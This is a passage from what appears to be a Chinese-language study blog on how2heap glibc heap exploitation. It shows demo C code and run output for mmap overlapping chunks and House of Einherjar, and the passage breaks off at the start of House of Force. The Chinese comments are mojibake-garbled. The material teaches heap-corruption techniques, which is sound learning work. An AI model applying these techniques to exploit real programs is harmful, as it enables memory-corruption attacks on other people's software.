class="hljs-comment"></span><br><span class="hljs-comment">data is read or written to, the program crashes.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Because of this added restriction, the main goal is to get the memory back from the system</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">to have two pointers assigned to the same location.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// Munmaps both the second and third pointers</span><br><br><span class="hljs-built_in">free</span>(mmap_chunk_3); <br><br><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Would crash, if on the following:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">mmap_chunk_2[0] = 0xdeadbeef;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This is because the memory would not be allocated to the current program.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Allocate a very large chunk with malloc. This needs to be larger than </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">the previously freed chunk because the mmapthreshold has increased to 0x202000.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">If the allocation is not larger than the size of the largest freed mmap </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">chunk then the allocation will happen in the normal section of heap memory.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br><br><br><span class="hljs-comment">// Gets the distance between the two pointers.</span><br><br><span class="hljs-type">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br><br><br><span class="hljs-comment">// Set the value of the overlapped chunk.</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);<br><br>overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br><br><br><span class="hljs-comment">// Show that the pointer has been written to.</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);<br><br>assert(mmap_chunk_2[<span class="hljs-number">0</span>] == overlapping_chunk[distance]);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./mmap_overlapping_chunks<br>This is performing an overlapping chunk attack but on extremely large <span class="hljs-title function_">chunks</span> <span class="hljs-params">(mmap chunks)</span>.<br>Extremely large chunks are special because they are allocated in their own mmaped section<br>of memory, instead of being put onto the normal heap.<br>=======================================================<br><br>Allocating three extremely large heap chunks of size <span class="hljs-number">0x100000</span> <br><br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fd91827c010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fd917ca7010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7fd917ba6010</span><br><br>Current System Memory Layout <br>================================================<br>running program<br>heap<br>....<br>third mmap chunk<br>second mmap chunk<br>LibC<br>....<br>ld<br>first mmap chunk<br>===============================================<br><br>Prev Size of third mmap chunk: <span class="hljs-number">0x0</span><br>Size of third mmap chunk: <span class="hljs-number">0x101002</span><br><br>Change the size of the third mmap chunk to overlap with the second mmap chunk<br>This will cause both chunks to be Munmapped and given back to the system<br>This is where the vulnerability occurs; corrupting the size or prev_size of a chunk<br>New size of third mmap chunk: <span class="hljs-number">0x202002</span><br>Free the third mmap chunk, which munmaps the second and third chunks<br><br>Get a very large chunk from <span class="hljs-built_in">malloc</span> to get mmapped chunk<br>This should overlap over the previously munmapped/freed chunks<br>Overlapped chunk Ptr: <span class="hljs-number">0x7fd917aa7010</span><br>Overlapped chunk Ptr Size: <span class="hljs-number">0x301002</span><br>Distance between new chunk and the second mmap <span class="hljs-title function_">chunk</span> <span class="hljs-params">(which was munmapped)</span>: 0x40000<br>Value of index 0 of mmap chunk 2 prior to write: 0<br>Setting the value of the overlapped chunk<br>Second chunk <span class="hljs-title function_">value</span> <span class="hljs-params">(after write)</span>: 0x1122334455667788<br>Overlapped chunk value: 0x1122334455667788<br><br>Boom! The new chunk has been overlapped with a previous mmaped chunk<br></code></pre></td></tr></table></figure><h2 id="House"><a href="#House" class="headerlink" title="House"></a>House</h2><h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h3><p>æˆ‘ä»¬åœ¨ä»»æ„åœ°å€ä¼ªé€ ä¸€ä¸ªfree_chunkï¼Œå¹¶ä¸”è®¾ç½®å †ä¸­chunkçš„<code>pre_size</code>ä½¿å †ç®¡ç†å™¨èƒ½å¤Ÿæ‰¾åˆ°æ ˆä¸­ä¼ªé€ çš„chunkï¼Œå½“æˆ‘ä»¬é‡Šæ”¾æ—¶ï¼Œå°±ä¼šæ‰¾åˆ°fake_chunkè¿›è¡Œåˆå¹¶ï¼Œä¸‹ä¸€æ¬¡åˆ†é…å°±ä¼šåœ¨æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Credit to st4g3r for publishing this technique</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br><br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar!\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><br><br><span class="hljs-type">uint8_t</span>* a;<br><br><span class="hljs-type">uint8_t</span>* b;<br><br><span class="hljs-type">uint8_t</span>* d;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br><br><br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br><br><br><span class="hljs-comment">// create a fake chunk</span><br><span class="hljs-comment">// æˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„ä½ç½®è®¾ç½®æˆ‘ä»¬çš„fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br><span class="hljs-comment">// æˆ‘ä»¬è®¾ç½®fake_chunkçš„fdå’Œbkéƒ½æŒ‡å‘å…¶æœ¬èº«ï¼Œä»¥ä¾¿æˆ‘ä»¬èƒ½å¤Ÿç»•è¿‡unlink</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br><br><span class="hljs-comment">// æ„é€ fake_chunk</span><br><span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br><br><span class="hljs-comment">// ç»•è¿‡æ£€æŸ¥</span><br>fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br><span class="hljs-comment">// éœ€è¦åœ¨smallbinçš„èŒƒå›´ä¹‹å†…</span><br>fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br><br>fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br><br>fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br><br>fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br><br>fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><br><br><span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span><br><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><br><span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br><br>a[real_a_size] = <span class="hljs-number">0</span>; <br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-comment">// bçš„å¤§å°æœ€å¥½æ˜¯0x100çš„å€æ•°ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è¿›è¡Œä½ä½çš„ä¿®æ”¹æ—¶å°±ä¸ä¼šä¿®æ”¹bçš„å¤§å°</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br><br>   <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br><br>   <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br><br><br><span class="hljs-comment">// Write a fake prev_size to the end of a</span><br><span class="hljs-comment">// ä¿®æ”¹bçš„prev_size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br><br>   <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br><span class="hljs-comment">// è¿™é‡Œprev_sizeçš„å¤§å°æ˜¯bçš„åˆå§‹æŒ‡é’ˆå‡å»fake_chunkçš„èµ·å§‹åœ°å€</span><br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br><br>*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br><br><br><span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br><br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><br><br><span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><br><br><span class="hljs-comment">//if we allocate another chunk before we free b we will need to </span><br><br><span class="hljs-comment">//do two things: </span><br><br><span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br><br><span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br><br><span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br><br><span class="hljs-comment">//at the location we control. </span><br><br><span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br><br><span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span><br><br><span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br><br><span class="hljs-comment">//wilderness</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_einherjar<br>Welcome to House of Einherjar!<br>Tested in Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique can be used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br><br>We allocate <span class="hljs-number">0x38</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span><br>a: <span class="hljs-number">0x208c010</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> after rounding: <span class="hljs-number">0x38</span><br><br>We create a fake chunk wherever we want, in this <span class="hljs-keyword">case</span> we<span class="hljs-number">&#x27;ll</span> create the chunk on the <span class="hljs-built_in">stack</span><br>However, you can also create the chunk in the heap or the bss, as <span class="hljs-type">long</span> as you know its address<br>We <span class="hljs-built_in">set</span> our fwd and bck pointers to point at the fake_chunk in order to pass the unlink <span class="hljs-title function_">checks</span><br><span class="hljs-params">(although we could <span class="hljs-keyword">do</span> the unsafe unlink technique here in some scenarios)</span><br>Our fake chunk at 0x7ffdcc8074d0 looks like:<br><span class="hljs-title function_">prev_size</span> <span class="hljs-params">(not used)</span>: 0x100<br>size: 0x100<br>fwd: 0x7ffdcc8074d0<br>bck: 0x7ffdcc8074d0<br>fwd_nextsize: 0x7ffdcc8074d0<br>bck_nextsize: 0x7ffdcc8074d0<br><br>We allocate 0xf8 bytes <span class="hljs-keyword">for</span> &#x27;b&#x27;.<br>b: 0x208c050<br><br>b.size: 0x101<br>b.size is: <span class="hljs-params">(<span class="hljs-number">0x100</span>)</span> | prev_inuse = <span class="hljs-number">0x101</span><br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x100</span><br>This is easiest <span class="hljs-keyword">if</span> b.size is a multiple of <span class="hljs-number">0x100</span> so you don<span class="hljs-number">&#x27;</span>t change the size of b, only its prev_inuse bit<br>If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk<br><br>We write a fake prev_size to the last <span class="hljs-number">8</span> bytes of a so that it will consolidate with our fake chunk<br>Our fake prev_size will be <span class="hljs-number">0x208c040</span> - <span class="hljs-number">0x7ffdcc8074d0</span> = <span class="hljs-number">0xffff800235884b70</span><br><br>Modify fake chunk<span class="hljs-number">&#x27;</span>s size to reflect b<span class="hljs-number">&#x27;</span>s new prev_size<br>Now we <span class="hljs-built_in">free</span> b and this will consolidate with our fake chunk since b prev_inuse is not <span class="hljs-built_in">set</span><br>Our fake chunk size is now <span class="hljs-number">0xffff8002358a5b31</span> (b.size + fake_prev_size)<br><br>Now we can call <span class="hljs-built_in">malloc</span>() and it will begin in our fake chunk<br>Next <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>) is at <span class="hljs-number">0x7ffdcc8074e0</span><br></code></pre></td></tr></table></figure><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h3><p>é€šè¿‡å°†top chunkçš„<code>size</code>ä¿®æ”¹æˆä¸€ä¸ªå¾ˆå¤§çš„æ•°æ®ï¼ˆå¦‚è´Ÿå·æ•´æ•°ï¼‰ï¼Œä»¥æ¬ºéª—libcåœ¨è¯·æ±‚å¾ˆå¤§ç©ºé—´çš„æ—¶å€™èƒ½å¤Ÿä½¿ç”¨top chunkæ¥åˆ†é…ï¼Œè¿™ä¸ªæ—¶å€™top chunkåŠ ä¸Šè¯·æ±‚ç©ºé—´çš„å¤§å°çš„æ—¶å€™å°±ä¼šè½¬ç§»åˆ°ä½åœ°å€å¤„ï¼Œä¾‹å¦‚<code>.bss</code>æ®µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 